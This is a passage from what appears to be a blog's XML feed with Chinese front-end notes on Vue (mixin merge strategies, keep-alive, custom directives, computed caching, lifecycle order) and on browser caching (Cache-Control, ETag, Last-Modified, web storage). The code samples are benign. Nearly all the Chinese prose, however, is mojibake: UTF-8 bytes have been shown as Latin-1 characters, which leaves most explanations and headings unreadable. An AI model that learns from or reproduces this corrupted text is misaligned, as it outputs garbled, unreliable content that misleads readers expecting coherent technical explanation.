<code>computed</code>ç­‰ã€‚<br>å½“ç»„ä»¶ä½¿ç”¨<code>mixins</code>æ—¶ï¼Œè¿™äº›é€‰é¡¹éƒ½ä¼šè¢«æ··å…¥è¯¥ç»„ä»¶æœ¬èº«çš„é€‰é¡¹ä¸­ã€‚</p><p><em>Mixinæ€ä¹ˆæ··å…¥å½“å‰ç»„ä»¶ï¼ŸMixinçš„åˆå¹¶ç­–ç•¥</em></p><ul><li>æ›¿æ¢å‹ç­–ç•¥æœ‰propsã€methodsã€injectã€computedï¼Œå°±æ˜¯å°†æ–°çš„åŒåå‚æ•°æ›¿ä»£æ—§çš„å‚æ•°</li><li>åˆå¹¶å‹ç­–ç•¥æ˜¯data, é€šè¿‡setæ–¹æ³•è¿›è¡Œåˆå¹¶å’Œé‡æ–°èµ‹å€¼</li><li>é˜Ÿåˆ—å‹ç­–ç•¥æœ‰ç”Ÿå‘½å‘¨æœŸå‡½æ•°å’Œwatchï¼ŒåŸç†æ˜¯å°†å‡½æ•°å­˜å…¥ä¸€ä¸ªæ•°ç»„ï¼Œç„¶åæ­£åºéå†ä¾æ¬¡æ‰§è¡Œ</li><li>å åŠ å‹æœ‰componentã€directivesã€filtersï¼Œå±‚å±‚çš„å åŠ <br>(æºç ä½ç½®ï¼š/src/core/global-api/mixin.js)</li></ul><p><br></p><h3 id="6-Keep-alive"><a href="#6-Keep-alive" class="headerlink" title="6. Keep-alive"></a>6. Keep-alive</h3><p><code>Keep-alive</code>æ˜¯<code>vue</code>ä¸­çš„ä¸€ä¸ªå†…ç½®ç»„ä»¶ï¼Œç”¨äºç¼“å­˜ç»„ä»¶ï¼Œèƒ½åœ¨ç»„ä»¶åˆ‡æ¢è¿‡ç¨‹ä¸­å°†ç»„ä»¶ä¿ç•™åœ¨å†…å­˜ä¸­ã€‚<br>ç¼“å­˜<code>vnode.componentInstance</code>ç»„ä»¶å®ä¾‹<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;keep-alive&gt;</span><br><span class="line">  &lt;router-view&gt;<span class="xml"><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">keep-alive</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="7-Directive"><a href="#7-Directive" class="headerlink" title="7. Directive"></a>7. Directive</h3><p>å†…ç½®æŒ‡ä»¤ï¼š</p><ul><li>v-html: æ’å…¥html</li><li>v-bind: ç»‘å®šä¸€ä¸ªå±æ€§ <code>v-bind:id=&quot;app&quot;</code> ç­‰åŒäº <code>:id=&quot;app&quot;</code></li><li>v-on: ç»‘å®šäº‹ä»¶, <code>v-on:click=&quot;&quot;</code> ç­‰åŒäº <code>@click=&quot;&quot;</code></li><li>v-model: åŒå‘ç»‘å®šï¼Œ<code>this.$data.foo = a</code> å’Œ <code>this.$emit</code>å¯ä»¥è§¦å‘æ›´æ–°<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Vue.directive(<span class="string">'focus'</span>, &#123;</span><br><span class="line">  bind: <span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;, <span class="comment">// æŒ‡ä»¤ç¬¬ä¸€æ¬¡ç»‘å®šåˆ°å…ƒç´ æ—¶</span></span><br><span class="line">  unbind: <span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;, <span class="comment">// æŒ‡ä»¤ä¸å…ƒç´ è§£ç»‘æ—¶</span></span><br><span class="line">  inserted: <span class="function">(<span class="params">el</span>) =&gt;</span> &#123; <span class="comment">// å…ƒç´ æ’å…¥çˆ¶èŠ‚ç‚¹æ—¶ï¼ˆä¸ä¸€å®šå·²è¢«æ’å…¥æ–‡æ¡£ä¸­ï¼‰</span></span><br><span class="line">    el.focus()</span><br><span class="line">  &#125;,</span><br><span class="line">  update: <span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;, <span class="comment">// æ‰€åœ¨ç»„ä»¶çš„VNodeæ›´æ–°æ—¶</span></span><br><span class="line">  componentUpdated: <span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125; <span class="comment">// æ‰€åœ¨ç»„ä»¶çš„ VNode åŠå…¶å­ VNode å…¨éƒ¨æ›´æ–°åè°ƒç”¨</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul><p>è‡ªå®šä¹‰æŒ‡ä»¤ï¼š</p><ul><li><p>v-title<br>æ–‡æœ¬æœ‰çœç•¥å·â€¦æ˜¾ç¤ºtitleï¼Œæ²¡æœ‰åˆ™ä¸æ˜¾ç¤º</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showOverflowTitle</span>(<span class="params">el: HTMLElement, binding: &#123; value: string &#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (el.title) <span class="keyword">return</span></span><br><span class="line">  el.title =</span><br><span class="line">    el.scrollWidth &gt; el.offsetWidth || el.scrollHeight &gt; el.offsetHeight</span><br><span class="line">      ? binding.value</span><br><span class="line">      : <span class="string">''</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.directive(<span class="string">'title'</span>, &#123;</span><br><span class="line">  mounted(el, binding) &#123;</span><br><span class="line">    el.addEventListener(<span class="string">'mouseover'</span>, showOverflowTitle.bind(<span class="keyword">this</span>, el, binding))</span><br><span class="line">  &#125;,</span><br><span class="line">  unmounted(el) &#123;</span><br><span class="line">    el.removeEventListener(<span class="string">'mouseover'</span>, showOverflowTitle)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">&lt;span v-title=<span class="string">"item.name"</span>&gt;&#123;&#123; item.name &#125;&#125;&lt;<span class="regexp">/span&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>v-hideIfOverflow<br>å¦‚æœdivæœ‰æ»šåŠ¨æ¡å°±éšè—</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hideOverflowElement</span>(<span class="params">el: HTMLElement</span>) </span>&#123;</span><br><span class="line">  el.style.opacity = el.scrollWidth &gt; el.offsetWidth ? <span class="string">'0'</span> : <span class="string">'1'</span></span><br><span class="line">&#125;</span><br><span class="line">app.directive(<span class="string">'hideIfOverflow'</span>, &#123;</span><br><span class="line">  mounted(el) &#123;</span><br><span class="line">    el.style.opacity = el.scrollWidth &gt; el.offsetWidth ? <span class="number">0</span> : <span class="number">1</span></span><br><span class="line">    <span class="built_in">window</span>.addEventListener(<span class="string">'resize'</span>, hideOverflowElement.bind(<span class="keyword">this</span>, el))</span><br><span class="line">  &#125;,</span><br><span class="line">  unmounted() &#123;</span><br><span class="line">    <span class="built_in">window</span>.removeEventListener(<span class="string">'resize'</span>, hideOverflowElement)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="8-Template"><a href="#8-Template" class="headerlink" title="8. Template"></a>8. Template</h3><p>ä¸ºä»€ä¹ˆæˆ‘æ”¯æŒæ¨¡æ¿è€Œä¸æ˜¯JSX</p><ul><li>JSXæä¾›æ›´é«˜çš„è‡ªç”±åº¦ï¼Œå®é™…åº”è¯¥é¿å…ä½¿ç”¨è¿™ç§è‡ªç”±åº¦ã€‚</li><li>æ¨¡æ¿é©±ä½¿ç¨‹åºå‘˜å†™m v vmåˆ†ç¦»çš„ä»£ç ï¼Œå‰ç«¯å¼€å‘çš„ä¸è‰¯è®¾è®¡ç»å¸¸æ˜¯æ··æ·†vå’Œvmå¯¼è‡´çš„</li><li>templateæ›´æœ‰åˆ©äºç‚¹å¯¹ç‚¹ç²’åº¦çš„æ›´æ–°è§¦å‘ï¼Œè€Œjsxåªèƒ½ä»¥ç»„ä»¶ä¸ºç²’åº¦è§¦å‘vdom diff</li></ul><p><br></p><h3 id="9-Computed"><a href="#9-Computed" class="headerlink" title="9. Computed"></a>9. Computed</h3><p><code>Computed</code>åœ¨æ³¨å†Œé˜¶æ®µï¼Œè§¦å‘å“åº”å¼æ•°æ®çš„getterä»è€Œå®Œæˆä¾èµ–æ”¶é›†</p><p><em>computedä¸ºä»€ä¹ˆä¼šè¢«ç¼“å­˜</em><br>æŸä¸ªè®¡ç®—å±æ€§Cï¼Œå®ƒä¾èµ–dataä¸­çš„Aï¼Œå¦‚æœæ²¡æœ‰ç¼“å­˜çš„è¯ï¼Œæ¯æ¬¡è¯»å–Cæ—¶ï¼ŒCéƒ½å›å»è¯»å–Aï¼Œä»è€Œè§¦å‘Açš„getã€‚å¤šæ¬¡è§¦å‘Açš„getæœ‰æ—¶å€™æ˜¯ä¸€ä¸ªéå¸¸æ¶ˆè€—æ€§èƒ½çš„æ“ä½œã€‚æ‰€ä»¥Computedå¿…é¡»è¦æœ‰ç¼“å­˜ã€‚</p><p><br></p><h3 id="10-Watch"><a href="#10-Watch" class="headerlink" title="10. Watch"></a>10. Watch</h3><p><code>watch</code>åœ¨æ³¨å†Œé˜¶æ®µï¼Œè§¦å‘å“åº”å¼æ•°æ®çš„getterä»è€Œå®Œæˆä¾èµ–æ”¶é›†</p><p><br></p><h3 id="11-ç”Ÿå‘½å‘¨æœŸ"><a href="#11-ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="11. ç”Ÿå‘½å‘¨æœŸ"></a>11. ç”Ÿå‘½å‘¨æœŸ</h3><p>Vueå®ä¾‹ä»åˆ›å»ºåˆ°é”€æ¯çš„è¿‡ç¨‹ï¼Œå°±æ˜¯ç”Ÿå‘½å‘¨æœŸï¼Œä»å¼€å§‹åˆ›å»ºã€åˆå§‹åŒ–æ•°æ®ã€ç¼–è¯‘æ¨¡æ¿ã€æŒ‚è½½DOM -&gt; æ›´æ–°æ¸²æŸ“ -&gt; å¸è½½ç­‰ä¸€ç³»åˆ—çš„è¿‡ç¨‹ã€‚</p><ul><li>ç»„ä»¶æŒ‚è½½: beforeCreate, created, beforeMount, mounted(å®ŒæˆDOMæ¸²æŸ“ï¼Œ å®˜æ–¹å®ä¾‹çš„å¼‚æ­¥è¯·æ±‚åœ¨mountedä¸­è°ƒç”¨ï¼Œå®é™…ä¸Šcreatedä¹Ÿå¯ä»¥)</li><li>ç»„ä»¶æ›´æ–°: beforeUpdate, updated</li><li>ç»„ä»¶å¸è½½: beforeDestroy, destroyed</li></ul><p>beforeCreate<br>ç»„ä»¶å®ä¾‹è¢«åˆ›å»ºä¹‹åˆï¼Œç»„ä»¶çš„å±æ€§ç”Ÿæ•ˆä¹‹å‰</p><p>created<br>ç»„ä»¶å®ä¾‹å·²ç»å®Œå…¨åˆ›å»ºï¼Œå±æ€§ä¹Ÿç»‘å®šï¼Œä½†çœŸå®domè¿˜æ²¡æœ‰ç”Ÿæˆï¼Œ$elè¿˜ä¸å¯ç”¨</p><p>beforeMount<br>åœ¨æŒ‚è½½å¼€å§‹ä¹‹å‰è¢«è°ƒç”¨ï¼šç›¸å…³çš„ render å‡½æ•°é¦–æ¬¡è¢«è°ƒç”¨</p><p>mounted<br>el è¢«æ–°åˆ›å»ºçš„ vm.$el æ›¿æ¢ï¼Œå¹¶æŒ‚è½½åˆ°å®ä¾‹ä¸Šå»ä¹‹åè°ƒç”¨è¯¥é’©å­</p><h3 id="12-ç”Ÿå‘½å‘¨æœŸæ‰§è¡Œé¡ºåº"><a href="#12-ç”Ÿå‘½å‘¨æœŸæ‰§è¡Œé¡ºåº" class="headerlink" title="12. ç”Ÿå‘½å‘¨æœŸæ‰§è¡Œé¡ºåº"></a>12. ç”Ÿå‘½å‘¨æœŸæ‰§è¡Œé¡ºåº</h3><p>æƒ³è±¡æœ‰ä¸€æ®µJSXï¼Œç»„ä»¶<code>&lt;ComponentA&gt;</code>ä¼šè¢«<code>babel-loader</code>è½¬æ¢æˆ<code>createElement</code>ï¼Œæ‰§è¡Œ<code>render()</code>çš„æ—¶å€™ï¼Œä¼šæ·±åº¦ä¼˜å…ˆéå†ï¼ˆDFSï¼‰ä¾æ¬¡ä»çˆ¶ç»„ä»¶å¾€é‡Œé¢æ‰§è¡Œï¼Œç„¶åå†ä¾æ¬¡å¾€å›<code>return</code>ã€‚</p><p>åŠ è½½æ¸²æŸ“è¿‡ç¨‹</p><ol><li>çˆ¶beforeCreate</li><li>çˆ¶created</li><li>çˆ¶beforeMount</li><li>å­beforeCreate</li><li>å­created</li><li>å­beforeMount</li><li>å­mounted</li><li>çˆ¶mounted</li></ol><p>å­ç»„ä»¶æ›´æ–°è¿‡ç¨‹ï¼š</p><ol><li>çˆ¶beforeUpdate</li><li>å­beforeUpdate</li><li>å­updated</li><li>çˆ¶updated</li></ol><p>é”€æ¯è¿‡ç¨‹ï¼š</p><ol><li>çˆ¶beforeDestroy</li><li>å­beforeDestroy</li><li>å­destroyed</li><li>çˆ¶destroyed</li></ol><p><br></p><h4 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h4><ul><li><a href="https://github.com/febobo/web-interview" target="_blank" rel="noopener">JSæ¯æ—¥ä¸€é¢˜</a></li><li><a href="https://juejin.cn/post/6906028995133833230" target="_blank" rel="noopener">åˆ†äº«8ä¸ªéå¸¸å®ç”¨çš„Vueè‡ªå®šä¹‰æŒ‡ä»¤</a></li><li><a href="https://github.com/theydy/notebook/issues" target="_blank" rel="noopener">notebook</a></li><li><a href="https://www.ruanyifeng.com/blog/2015/05/require.html" target="_blank" rel="noopener">require()æºç è§£è¯»</a></li><li><a href="https://blog.csdn.net/lznism666/article/details/108513723" target="_blank" rel="noopener">Vueä¸­computedåŸç†åˆ†æ</a></li></ul>]]></content>
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ğŸ¤” æµè§ˆå™¨ç¼“å­˜ï¼ˆå¼ºç¼“å­˜ã€åè®®ç¼“å­˜ï¼‰ã€ç¦»çº¿ç¼“å­˜</title>
      <link href="/2019/10/08/%E7%BC%93%E5%AD%98/"/>
      <url>/2019/10/08/%E7%BC%93%E5%AD%98/</url>
      <content type="html"><![CDATA[<h3 id="1-ç®€ä»‹"><a href="#1-ç®€ä»‹" class="headerlink" title="1. ç®€ä»‹"></a>1. ç®€ä»‹</h3><p><em>ç¢°åˆ°çš„ç¼“å­˜é—®é¢˜â€¦</em></p><ul><li>æ¯æ¬¡éƒ½åŠ è½½åŒæ ·çš„é™æ€æ–‡ä»¶ï¼Ÿ</li><li>åå•†ç¼“å­˜è¿˜æ˜¯è¦å’ŒæœåŠ¡å™¨é€šä¿¡ï¼Œæ€æ ·å¯ä»¥çœæ‰è¿™ä¸ªè¯·æ±‚ï¼Ÿ</li><li>è¿™äº›æ•°æ®ã€æ–‡ä»¶çš„æœ‰æ•ˆæ—¶é—´è¦æ€ä¹ˆå®šï¼Œä¼šä¸ä¼šå¤ªå®¹æ˜“å¤±æ•ˆï¼Ÿ</li><li>é‡å¤çš„æ— æ•ˆè¯·æ±‚å¤ªå¤šï¼Ÿæ•°æ®éœ€è¦ç¼“å­˜èµ·æ¥ï¼Œåº”è¯¥æ”¾åœ¨é‚£é‡Œï¼Ÿ</li><li>å¦‚ä½•æ›´æ–°ç¼“å­˜ï¼Œæ›´æ–°çš„ä¾æ®æ˜¯ä»€ä¹ˆï¼Ÿ</li><li>ä»€ä¹ˆæ˜¯Memory Cache, Disk Cache, Push Cache</li></ul><p><strong>è¿™é‡Œç½—åˆ—äº†ç¼“å­˜çš„æ‰€æœ‰åˆ†ç±»..</strong><br><img src="/2019/10/08/ç¼“å­˜/1.png"></p><p><br></p><p><br></p><h3 id="2-HTTP-headerç¼“å­˜æœºåˆ¶"><a href="#2-HTTP-headerç¼“å­˜æœºåˆ¶" class="headerlink" title="2. HTTP headerç¼“å­˜æœºåˆ¶"></a>2. HTTP headerç¼“å­˜æœºåˆ¶</h3><h4 id="2-1-çŠ¶æ€ç "><a href="#2-1-çŠ¶æ€ç " class="headerlink" title="2.1 çŠ¶æ€ç "></a>2.1 çŠ¶æ€ç </h4><p>æµè§ˆå™¨æ ¹æ®ç¬¬ä¸€æ¬¡è¯·æ±‚èµ„æºæ—¶è¿”å›çš„ <em>å“åº”å¤´</em> æ¥ç¡®å®šï¼Œä¸€ä¸ªèµ„æºè¯¥ä¸è¯¥è¢«ç¼“å­˜ã€‚å¦‚æœè¿™æ˜¯ä¸ªå¯ä»¥è¢«ç¼“å­˜çš„èµ„æºï¼Œæµè§ˆå™¨ä¼šæŠŠå®ƒå­˜åˆ°å†…å­˜(memory cache)æˆ–è€…ç£ç›˜(disk cache)ä¸­ï¼ŒåŒæ—¶æŠŠç¼“å­˜æ ‡è¯†è®°å½•ä¸‹æ¥ã€‚<br><img src="/2019/10/08/ç¼“å­˜/6.png" style="max-width: 500px; margin: 30px auto;"></p><p>ç¬¬äºŒæ¬¡è¯·æ±‚èµ„æºæ—¶ï¼Œä¼šè¿”å›è¿™äº›<em>çŠ¶æ€ç </em>ã€‚</p><table><thead><tr><th>çŠ¶æ€ç </th><th style="text-align:center"></th></tr></thead><tbody><tr><td>200</td><td style="text-align:center">å¼ºç¼“å­˜ Expires/Cache-Controlå¤±æ•ˆæ—¶ï¼Œå¹¶ä¸”åè®®ç¼“å­˜è¿‡æœŸï¼Œè¿”å›æ–°çš„èµ„æºæ–‡ä»¶</td></tr><tr><td>200(from cache)</td><td style="text-align:center">å¼ºç¼“å­˜ Expires/Cache-Controlæœªè¿‡æœŸï¼Œæµè§ˆå™¨ä»æœ¬åœ°è·å–èµ„æºæˆåŠŸã€‚<br></td></tr><tr><td>304(Not Modified)</td><td style="text-align:center">åå•†ç¼“å­˜Last-modified/Etagæ²¡æœ‰è¿‡æœŸæ—¶ï¼ŒæœåŠ¡ç«¯è¿”å›çŠ¶æ€ç 304</td></tr></tbody></table><p><img src="/2019/10/08/ç¼“å­˜/5.png" style="max-width: 300px; margin: 20px auto;"></p><p><br><br><br></p><h4 id="2-1-å¼ºç¼“å­˜"><a href="#2-1-å¼ºç¼“å­˜" class="headerlink" title="2.1 å¼ºç¼“å­˜"></a>2.1 å¼ºç¼“å­˜</h4><p>ä¸ä¼šå‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œç›´æ¥ä»ç¼“å­˜ä¸­è¯»å–èµ„æºã€‚å¼ºç¼“å­˜é€šè¿‡Expireså’ŒCache-Controlä¸¤ç§å“åº”å¤´å®ç°ã€‚</p><p><em>1. Expires</em><br>Expiresæ˜¯HTTP 1.0æå‡ºçš„ä¸€ä¸ªè¡¨ç¤ºèµ„æºè¿‡æœŸæ—¶é—´çš„å­—æ®µï¼Œæè¿°ä¸€ä¸ªç»å¯¹æ—¶é—´ï¼Œç”±æœåŠ¡å™¨è¿”å›ã€‚Expireså—é™äºæœ¬åœ°æ—¶é—´ï¼Œå¦‚æœä¿®æ”¹äº†æœ¬åœ°æ—¶é—´ï¼Œå¯èƒ½ä¼šé€ æˆç¼“å­˜å¤±æ•ˆã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Expires: Wed, 11 May 2018 07:20:00 GMT</span><br></pre></td></tr></table></figure></p><p><br><br><em>2. Cache-Control</em><br>å‡ºç°äºHTTP 1.1ï¼Œä¼˜å…ˆçº§é«˜äºExpiresï¼Œ è¡¨ç¤ºçš„æ˜¯ç›¸å¯¹æ—¶é—´<br><code>Cache-Control: no-store</code> æµè§ˆå™¨å’Œç¼“å­˜æœåŠ¡å™¨ï¼Œä¸ç¼“å­˜æ•°æ®åˆ°æœ¬åœ°ç£ç›˜ä¸­<br><code>Cache-Control: no-cache</code> æµè§ˆå™¨å’Œç¼“å­˜æœåŠ¡å™¨ä¸åº”è¯¥ç¼“å­˜é¡µé¢ä¿¡æ¯<br><code>Cache-Control: public</code> å¯ä»¥è¢«æ‰€æœ‰ç”¨æˆ·ç¼“å­˜ï¼ŒåŒ…æ‹¬ç»ˆç«¯å’ŒCDNç­‰ä¸­é—´ä»£ç†æœåŠ¡å™¨<br><code>Cache-Control: private</code> åªèƒ½è¢«ç»ˆç«¯æµè§ˆå™¨ç¼“å­˜ï¼Œä¸å…è®¸ä¸­ç»§ç¼“å­˜æœåŠ¡å™¨è¿›è¡Œç¼“å­˜<br><code>Cache-Control: max-age=30</code>ç¼“å­˜30ç§’åå°±è¿‡æœŸï¼Œéœ€è¦é‡æ–°è¯·æ±‚<br><code>Cache-Control: s-maxage=30</code>è¦†ç›–max-ageï¼Œä½œç”¨ä¸€æ ·ï¼Œåªåœ¨ä»£ç†æœåŠ¡å™¨ç”Ÿæ•ˆ</p><p><br></p><h4 id="2-2-åå•†ç¼“å­˜"><a href="#2-2-åå•†ç¼“å­˜" class="headerlink" title="2.2 åå•†ç¼“å­˜"></a>2.2 åå•†ç¼“å­˜</h4><p>å¼ºåˆ¶ç¼“å­˜å¤±æ•ˆåï¼Œæµè§ˆå™¨æºå¸¦ç¼“å­˜æ ‡è¯†å‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚ï¼Œç”±æœåŠ¡å™¨æ ¹æ®ç¼“å­˜æ ‡è¯†å†³å®šæ˜¯å¦ä½¿ç”¨ç¼“å­˜ã€‚åå•†ç¼“å­˜åˆ©ç”¨<code>Last-Modified</code>, <code>If-Modified-Since</code>å’Œ<code>ETag</code>, <code>If-None-Match</code>è¿™ä¸¤å¯¹æ ‡è¯†æ¥ç®¡ç†ã€‚<br><img src="/2019/10/08/ç¼“å­˜/7.png" style="max-width:600px;margin: 30px auto"></p><p><em>1. Last-Modifiedï¼Œ If-Modified-Since</em><br>è¡¨ç¤ºæœ¬åœ°æ–‡ä»¶æœ€åä¿®æ”¹æ—¥æœŸã€‚<br>æµè§ˆå™¨ä¼šåœ¨request headeråŠ ä¸Š<em><code>If-Modified-Since</code></em>(ä¸Šæ¬¡å“åº”å¤´ä¸­çš„Last-Modified)ï¼Œè¯¢é—®æœåŠ¡å™¨åœ¨è¯¥æ—¥æœŸåèµ„æºæ˜¯å¦æœ‰æ›´æ–°ï¼Œæœ‰æ›´æ–°çš„è¯å°±ä¼šå°†æ–°çš„èµ„æºå‘é€å›æ¥ã€‚ä½†æ˜¯å¦‚æœåœ¨æœ¬åœ°æ‰“å¼€ç¼“å­˜æ–‡ä»¶ï¼Œå°±ä¼šé€ æˆLast-Modifiedè¢«ä¿®æ”¹ï¼Œæ‰€ä»¥åœ¨HTTP / 1.1å‡ºç°äº†ETagã€‚</p><p><br><br><em>2. ETag, If-None-Match</em><br>ETagåƒä¸€ä¸ªæŒ‡çº¹ï¼Œèµ„æºå˜åŒ–éƒ½ä¼šå¯¼è‡´ETagå˜åŒ–ï¼Œå®ƒå¯ä»¥ä¿è¯æ¯ä¸€ä¸ªèµ„æºæ˜¯å”¯ä¸€çš„ã€‚<br>æµè§ˆå™¨ä¼šåœ¨request headeråŠ ä¸Š<em><code>If-None-Match</code></em>(ä¸Šæ¬¡ç›¸åº”å¤´ä¸­çš„ETag)å‘é€ç»™æœåŠ¡å™¨ï¼Œè¯¢é—®è¯¥èµ„æºçš„ETagæ˜¯å¦æœ‰æ›´æ–°ï¼Œæœ‰å˜åŠ¨å°±ä¼šå‘é€æ–°çš„èµ„æºå›æ¥ã€‚</p><p><img src="/2019/10/08/ç¼“å­˜/3.png"></p><p>ETagçš„ä¼˜å…ˆçº§æ¯”Last-Modifiedæ›´é«˜ï¼Œä¼˜å…ˆä½¿ç”¨ETagæœ‰ä¸‹é¢å‡ ç§æƒ…å†µè€ƒè™‘ï¼š</p><ul><li>ä¸€äº›æ–‡ä»¶ä¹Ÿè®¸ä¼šå‘¨æœŸæ€§çš„æ›´æ”¹ï¼Œä½†å®ƒçš„å†…å®¹å¹¶ä¸æ”¹å˜ï¼ˆä»…ä»…æ”¹å˜çš„æ˜¯ä¿®æ”¹æ—¶é—´ï¼‰</li><li>æŸäº›æ–‡ä»¶ä¿®æ”¹éå¸¸é¢‘ç¹ï¼ŒIf-Modified-Sinceèƒ½æ£€æŸ¥åˆ°çš„ç²’åº¦æ˜¯sçº§ï¼Œå¯¹äºç§’ä»¥ä¸‹çš„ä¿®æ”¹åˆ™æ— æ³•åˆ¤æ–­</li><li>æŸäº›æœåŠ¡å™¨ä¸èƒ½ç²¾ç¡®çš„å¾—åˆ°æ–‡ä»¶çš„æœ€åä¿®æ”¹æ—¶é—´</li></ul><p><br></p><h4 id="2-3-ç¼“å­˜ç­–ç•¥"><a href="#2-3-ç¼“å­˜ç­–ç•¥" class="headerlink" title="2.3 ç¼“å­˜ç­–ç•¥"></a>2.3 ç¼“å­˜ç­–ç•¥</h4><ul><li>é…ç½®è¶…é•¿æ—¶é—´çš„æœ¬åœ°ç¼“å­˜</li><li>é‡‡ç”¨å†…å®¹æ‘˜è¦ä½œä¸ºç¼“å­˜æ›´æ–°ä¾æ®  â€”â€” ç²¾ç¡®æ§åˆ¶ç¼“å­˜</li><li>é™æ€èµ„æºéƒ¨ç½²CDN</li><li>é™æ€èµ„æºæ–‡ä»¶é€šè¿‡Service Workerè¿›è¡Œç¼“å­˜æ§åˆ¶å’Œç¦»çº¿åŒ–åŠ è½½</li><li>æ›´æ–°èµ„æºå®ç°éè¦†ç›–å¼å‘å¸ƒ</li></ul><p><strong>å…·ä½“æ“ä½œ</strong></p><ul><li>å¯¹äºä¸éœ€è¦ç¼“å­˜çš„èµ„æºï¼Œä½¿ç”¨<em><code>Cache-control: no-store</code></em></li><li>å¯¹äºé¢‘ç¹å˜åŠ¨çš„èµ„æºï¼ˆæ¯”å¦‚ç»å¸¸éœ€è¦åˆ·æ–°çš„é¦–é¡µï¼Œèµ„è®¯è®ºå›æ–°é—»ç±»ï¼‰ï¼Œå¯ä»¥ä½¿ç”¨<em><code>Cache-control: no-cache</code></em>å¹¶é…åˆ<em><code>ETag</code></em>ï¼Œè¡¨ç¤ºè¯¥èµ„æºå·²è¢«ç¼“å­˜ï¼Œä½†æ˜¯æ¯æ¬¡éƒ½ä¼šå‘é€è¯·æ±‚è¯¢é—®èµ„æºæ˜¯å¦éœ€è¦æ›´æ–°</li><li>å¯¹äºä»£ç æ–‡ä»¶ï¼Œé€šå¸¸ä½¿ç”¨<em><code>Cache-control: max-age=31536000</code></em>å¼ºç¼“å­˜ï¼Œç„¶åå¯¹æ–‡ä»¶è¿›è¡ŒæŒ‡çº¹å¤„ç†ï¼Œä¸€æ—¦æ–‡ä»¶åå˜åŠ¨å°±ä¼šç«‹åˆ»ä¸‹è½½æ–°çš„æ–‡ä»¶</li></ul><p><br></p><h3 id="3-æ•°æ®å­˜å‚¨"><a href="#3-æ•°æ®å­˜å‚¨" class="headerlink" title="3. æ•°æ®å­˜å‚¨"></a>3. æ•°æ®å­˜å‚¨</h3><p>é™¤äº†è¯·æ±‚ç¼“å­˜ï¼Œæˆ‘ä»¬è¿˜ä¼šæŠŠå­˜å‚¨ä»æœåŠ¡å™¨è·å–çš„æ•°æ®ï¼Œä¹Ÿæ˜¯é¡µé¢éœ€è¦é¢‘ç¹ç”¨åˆ°çš„æ•°æ®<br><em>cookie</em>ï¼š4Kï¼Œå¯ä»¥æ‰‹åŠ¨è®¾ç½®å¤±æ•ˆæœŸ<br><em>localStorage</em>ï¼š5Mï¼Œé™¤éæ‰‹åŠ¨æ¸…é™¤ï¼Œå¦åˆ™ä¸€ç›´å­˜åœ¨<br><em>sessionStorage</em>ï¼š5Mï¼Œä¸å¯ä»¥è·¨æ ‡ç­¾è®¿é—®ï¼Œé¡µé¢å…³é—­å°±æ¸…ç†<br><em>indexedDB</em> ï¼šæµè§ˆå™¨ç«¯æ•°æ®åº“ï¼Œæ— é™å®¹é‡ï¼Œé™¤éæ‰‹åŠ¨æ¸…é™¤ï¼Œå¦åˆ™ä¸€ç›´å­˜åœ¨</p><p><strong>å…±åŒç‚¹</strong></p><ul><li>éƒ½æ˜¯ä¿å­˜åœ¨æµè§ˆå™¨ç«¯ã€ä¸”åŒæºçš„<br><br></li></ul><p><strong>åŒºåˆ«</strong></p><ul><li>cookieæ•°æ®å§‹ç»ˆåœ¨åŒæºçš„httpè¯·æ±‚ä¸­æºå¸¦ï¼ˆå³ä½¿ä¸éœ€è¦ï¼‰ï¼Œå³cookieåœ¨æµè§ˆå™¨å’ŒæœåŠ¡å™¨é—´æ¥å›ä¼ 